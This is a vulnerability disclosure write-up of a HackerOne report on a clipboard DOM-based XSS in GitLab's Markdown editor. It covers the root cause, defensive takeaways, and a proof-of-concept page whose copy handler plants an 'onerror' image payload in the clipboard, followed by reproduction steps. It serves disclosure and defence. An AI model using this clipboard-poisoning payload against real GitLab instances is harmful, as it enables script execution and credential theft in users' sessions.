# Clipboard DOM-based XSS in GitLab Markdown Editor

## Metadata
- **Source:** HackerOne
- **Report:** 1196958 | https://hackerone.com/reports/1196958
- **Submitted:** 2021-05-14
- **Reporter:** vovohelo
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** DOM-based XSS, Improper Input Validation, Unsafe innerHTML Assignment
- **CVEs:** None
- **Category:** web-api

## Summary
A DOM-based XSS vulnerability exists in GitLab's copy_as_gfm.js file where unsanitized clipboard data (text/x-gfm-html MIME type) is directly assigned to the innerHTML property of a dynamically created div element. An attacker can craft a malicious webpage that, when a user copies from it and pastes into GitLab markdown fields, executes arbitrary JavaScript under the user's credentials.

## Attack scenario
1. Attacker creates a malicious webpage with a copy event handler that injects XSS payload into the text/x-gfm-html clipboard MIME type
2. Attacker tricks or socially engineers a GitLab user to visit the malicious webpage and copy content
3. User copies the content from the malicious site, poisoning their clipboard with the XSS payload
4. User navigates to GitLab and opens an editable markdown field (e.g., issue description or comment)
5. User pastes the clipboard content into the markdown editor, triggering the pasteGFM function
6. The unsanitized gfmHtml value from clipboard is assigned to div.innerHTML, executing the injected JavaScript in the user's browser context

## Root cause
The pasteGFM function in app/assets/javascripts/behaviors/markdown/copy_as_gfm.js retrieves clipboard data via clipboardData.getData('text/x-gfm-html') without any sanitization or validation, then directly assigns it to the innerHTML property of a dynamically created DOM element, allowing HTML/JavaScript injection.

## Attacker mindset
An attacker would target GitLab users by creating convincing decoy webpages in technical communities or forums where GitLab users congregate. The attack is stealthy since it leverages the user's own clipboard and trusted GitLab domain, making it suitable for credential theft, session hijacking, or lateral movement within GitLab instances.

## Defensive takeaways
- Never assign untrusted data directly to innerHTML; use textContent or safer APIs like insertAdjacentHTML with sanitization
- Implement DOMPurify or similar HTML sanitization library for any user-controlled HTML content before DOM insertion
- Validate and sanitize all clipboard data before processing, treating it as potentially malicious user input
- Use Content Security Policy (CSP) with strict directives to mitigate XSS impact (note: the report mentions CSP provides some protection on gitlab.com)
- Apply input validation to clipboard MIME types and reject unexpected formats
- Consider using textContent instead of innerHTML when plain text representation is sufficient
- Implement security code review process specifically focusing on clipboard handling and innerHTML usage patterns

## Variant hunting
Search codebase for: (1) Other uses of clipboardData.getData() without sanitization, (2) innerHTML assignments without sanitization from any external source, (3) Similar MIME type handlers (text/x-*, application/*) that may be vulnerable, (4) Other markdown editor integrations that might have similar copy/paste handlers, (5) Any dynamically created elements receiving clipboard data

## MITRE ATT&CK
- T1190
- T1203
- T1566

## Notes
The vulnerability is mitigated on production gitlab.com due to CSP, but remains exploitable in default GitLab installations without strict CSP. The attack vector is particularly effective because it leverages the native clipboard API and user trust in their own copy/paste workflow. The fix should involve using textContent or implementing proper HTML sanitization with a library like DOMPurify before any innerHTML assignment.

## Full report
<details><summary>Expand</summary>

### Summary

A clipboard DOM-based XSS exists on several Markdown text fields. 

### Technical details

The *app/assets/javascripts/behaviors/markdown/copy_as_gfm.js* file is used to get and set GFM (GitHub Flavored Markdown) data on the clipboard on different parts of the GitLab application. If a user copies data from a malicious website and copies it in one of the text fields in which the **pasteGFM** function is used, the attacker can execute arbitrary JavaScript code under the user's credentials. The vulnerability exists because the **gfmHtml** variable value is assigned without sanitization directly from the clipboard and later used to set the **innerHTML** property of a dynamically created *div* element. The following code snippet contains the vulnerable code with additional comments for better explaining the issue.

```js
  static pasteGFM(e) {
    const { clipboardData } = e.originalEvent;
    if (!clipboardData) return;

    const text = clipboardData.getData('text/plain');
    const gfm = clipboardData.getData('text/x-gfm');
    const gfmHtml = clipboardData.getData('text/x-gfm-html'); /* <-- Data is copied from the clipboard*/
    if (!gfm && !gfmHtml) return;

    e.preventDefault();

    // We have the original selection already converted to gfm
    if (gfm) {
      CopyAsGFM.insertPastedText(e.target, text, gfm);
    } else {
      // Due to the async copy call we are not able to produce gfm so we transform the cached HTML
      const div = document.createElement('div'); /* <-- Div element is created*/
      div.innerHTML = gfmHtml; /* <-- innerHTML is set */
      CopyAsGFM.nodeToGFM(div)
        .then((transformedGfm) => {
          CopyAsGFM.insertPastedText(e.target, text, transformedGfm);
        })
        .catch(() => {});
    }
  }
```

### Steps to reproduce
On a testing machine, perform the following steps:

1. Install the Docker container engine
1. Create an HTML file like the following:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clipboard-XSS</title>
</head>
<body>
    <h3>Try out our new clipboard plugin</h3>
    <p>Copy <strong>here</strong>, paste it on the editor and see what happens!</p>
    <script>
        document.oncopy = event => {
            event.preventDefault();
            event.clipboardData.setData('text/x-gfm-html', 'XSS<img/src/onerror=alert(1)>');
            console.log("updated clipboard");
        }
    </script>
</body>
</html>
```
2. Spin a new GitLab container with the following commands:
```bash
export GITLAB_HOME=/srv/gitlab
sudo docker run --detach   --hostname gitlab.example.com   --publish 4443:443 --publish 8080:80 --publish 2222:22   --name gitlab   --restart always   --volume $GITLAB_HOME/config:/etc/gitlab   --volume $GITLAB_HOME/logs:/var/log/gitlab   --volume $GITLAB_HOME/data:/var/opt/gitlab   gitlab/gitlab-ce:latest
```
3. Using a web browser, navigate to the HTML file created in step 1
4. Select the word **here** as instructed and copy it to the clipboard
5. Navigate to http://localhost:8080/ and follow the instructions required to set up the password for the root user
6. Using the previously set password, log in as the root user
7. On the projects list, click on the **GitLab Instance / Monitoring** project
8. On the left pane, click on **Issues**
9. Click on the **New issue** button
10. Paste the contents from the clipboard on the Description textarea
11. Check an alert box is displayed

### Impact

This is a standard XSS vulnerability. An attacker may force users to perform any activities available through the application's Javascript API or use this for credential harvesting, etc.

### Examples

The following PoC video demonstrates the attack
{F1300761}


### What is the current *bug* behavior?

Pasting content triggers arbitrary JavaScript code execution when the **text/x-gfm-html** MIME type is used.

### What is the expected *correct* behavior?

Pasting content should not trigger JavaScript code execution.

### Relevant logs and/or screenshots

(Paste any relevant logs - please use code blocks (```) to format console output,
logs, and code as it's very hard to read otherwise.)

### Output of checks

This bug exists in https://gitlab.com/ but is currently unexploitable due to CSP.

#### Results of GitLab environment info

```
System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	2.7.2p137
Gem Version:	3.1.4
Bundler Version:2.1.4
Rake Version:	13.0.3
Redis Version:	6.0.12
Git Version:	2.31.1
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.11.3
Revision:	b321336e443
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.6
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	13.17.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

This is a standard XSS vulnerability. An attacker may force users to perform any activities available through the application's Javascript API or use this for credential harvesting, etc.

</details>

---
*Analysed by Claude on 2026-05-12*
